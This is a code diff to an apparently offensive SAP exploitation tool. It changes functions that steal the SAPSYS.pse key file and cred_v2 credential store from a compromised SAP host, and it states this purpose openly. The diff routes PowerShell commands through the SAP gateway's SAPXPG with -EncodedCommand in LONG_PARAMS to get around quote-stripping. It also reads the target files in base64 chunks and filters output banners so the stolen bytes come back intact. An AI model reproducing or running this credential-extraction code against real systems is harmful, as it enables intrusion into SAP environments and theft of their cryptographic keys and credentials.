@@ -592,13 +592,28 @@ def _discover_sap_root_windows(gw_exec_fn: GwExecFn,
 
 def _read_file_b64_windows(gw_exec_fn: GwExecFn, path: str,
                             chunk_raw_bytes: int = 72,
-                            verbose: bool = False) -> dict:
+                            verbose: bool = False,
+                            node=None) -> dict:
     """Chunked binary read on a Windows target via PowerShell.
 
     Mirrors the Linux ``make_chunked_read_adapter._read_chunked`` path
-    but uses PowerShell's Get-Content -Encoding Byte slicing instead of
-    Python3's open().read()[O:E].  Each chunk emits one base64 line of
-    ~96 chars, which fits SAPXPG's ~128-byte per-TLV stdout ceiling.
+    but uses PowerShell's ``[IO.File]::ReadAllBytes(...)`` slicing
+    instead of Python3's ``open().read()[O:E]``.  Each chunk emits one
+    base64 line of ~96 chars, which fits SAPXPG's ~128-byte per-TLV
+    stdout ceiling.
+
+    PowerShell is invoked via ``-EncodedCommand`` (UTF-16LE base64) so
+    the inner script never has to dodge cmd.exe/sapxpg quote-stripping
+    of double quotes and parentheses — a recurring class of bug where
+    PowerShell ended up parsing only ``-Command (Get-Item`` and failed
+    with "Missing closing ')'" because the argv reassembly inside the
+    SAP kernel dropped the surrounding double quotes.
+
+    A SAPNode (``node`` kwarg) is required because the encoded
+    payload exceeds the 255-byte PARAMS field; we have to place it in
+    LONG_PARAMS (1024B) with PARAMS="", which the per-node
+    ``execute_gw_command`` call lets us do directly without going
+    through the chunked-read adapter wrapper.
 
     Returns the standard ``{success, bytes, error, raw_output}`` shape
     so callers can substitute this for ``_read_file_b64`` on Windows
@@ -609,10 +624,38 @@ def _read_file_b64_windows(gw_exec_fn: GwExecFn, path: str,
     result = {"success": False, "bytes": None, "error": "",
               "raw_output": []}
 
-    # Size first — Get-Item returns the size via .Length
-    r_sz = gw_exec_fn(
-        "powershell",
-        f"-Command \"(Get-Item '{path}').Length\"")
+    if node is None:
+        # Caller didn't thread the node down; without it we can't
+        # bypass the wrapper.  Bail with a clear error rather than
+        # silently falling back to the (broken) double-quoted path.
+        result["error"] = ("internal: _read_file_b64_windows requires "
+                            "node= to use -EncodedCommand")
+        return result
+
+    # Lazy import — avoid touching sapmap_exploit at module load time
+    # (this module is also pulled into tests where the GW machinery
+    # isn't desired).
+    from sapmap_exploit import execute_gw_command
+
+    def _ps_enc(script: str) -> str:
+        return _b64_mod.b64encode(
+            script.encode("utf-16le")).decode("ascii")
+
+    def _run_ps(script: str) -> dict:
+        enc = _ps_enc(script)
+        # PARAMS="" + LONG_PARAMS=full args.  On Win kernels (700/742/
+        # 753 verified) the kernel concatenates the two fields — with
+        # PARAMS empty the cmdline is just LONG_PARAMS, which keeps the
+        # base64 token intact (it has no whitespace so no argv-split
+        # damage either).
+        return execute_gw_command(
+            node, "powershell", "",
+            long_params=f"-NoProfile -EncodedCommand {enc}")
+
+    # Size first — emit ONLY the integer so the size parser sees it
+    # cleanly (Powershell adds a CLIXML banner to stderr — that's why
+    # we look for the first all-digit line below rather than r[0]).
+    r_sz = _run_ps(f"(Get-Item '{path}').Length")
     if not r_sz.get("success"):
         result["error"] = "powershell Get-Item failed: file may not exist"
         return result
@@ -642,22 +685,26 @@ def _read_file_b64_windows(gw_exec_fn: GwExecFn, path: str,
         beg = i * chunk_raw_bytes
         end_excl = min(beg + chunk_raw_bytes, size)
         end_inc = end_excl - 1
-        # PowerShell -Encoding Byte returns a [byte[]] which we slice
-        # then base64-encode and emit as a single line.
-        ps_cmd = (
-            f"$b = [IO.File]::ReadAllBytes('{path}'); "
+        r = _run_ps(
+            f"$b=[IO.File]::ReadAllBytes('{path}');"
             f"[Convert]::ToBase64String($b[{beg}..{end_inc}])")
-        r = gw_exec_fn("powershell", f'-Command "{ps_cmd}"')
         if not r.get("success"):
             result["error"] = (
                 f"PowerShell chunk {i+1}/{n_chunks} failed: "
                 f"{r.get('error') or '(no error)'}")
             return result
-        # First non-blank line of output should be the base64 string.
+        # Find the base64 token amongst the PowerShell output.
+        # PowerShell's -EncodedCommand path emits a "#< CLIXML"
+        # banner to stderr/stdout (object-serialization header) which
+        # is non-blank, doesn't trip _looks_like_error, but isn't
+        # base64 either — match strictly on the base64 alphabet so
+        # the banner gets skipped reliably.
         chunk_b64 = ""
         for ln in r.get("output", []) or []:
             ln = ln.strip()
-            if ln and not _looks_like_error(ln):
+            if not ln or _looks_like_error(ln):
+                continue
+            if re.fullmatch(r"[A-Za-z0-9+/=]+", ln):
                 chunk_b64 = ln
                 break
         if not chunk_b64:
@@ -755,7 +802,8 @@ def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
                         secudir: Optional[str] = None,
                         save_loot: bool = True,
                         label: str = "",
-                        os_type: Optional[str] = None) -> dict:
+                        os_type: Optional[str] = None,
+                        node=None) -> dict:
     """Extract SAPSYS.pse + cred_v2 from a compromised SAP host.
 
     Args:
@@ -899,7 +947,7 @@ def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
     print(f"{tag}: reading {pse_path} via "
           f"{'PowerShell chunks' if os_type == 'windows' else 'base64'} ...")
     if os_type == "windows":
-        r_pse = _read_file_b64_windows(gw_exec_fn, pse_path)
+        r_pse = _read_file_b64_windows(gw_exec_fn, pse_path, node=node)
     else:
         r_pse = _read_file_b64(gw_exec_fn, pse_path)
     if not r_pse["success"]:
@@ -916,7 +964,8 @@ def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
         print(f"{tag}: reading {cred_path} via "
               f"{'PowerShell chunks' if os_type == 'windows' else 'base64'} ...")
         if os_type == "windows":
-            r_cred = _read_file_b64_windows(gw_exec_fn, cred_path)
+            r_cred = _read_file_b64_windows(gw_exec_fn, cred_path,
+                                              node=node)
         else:
             r_cred = _read_file_b64(gw_exec_fn, cred_path)
         if r_cred["success"]:
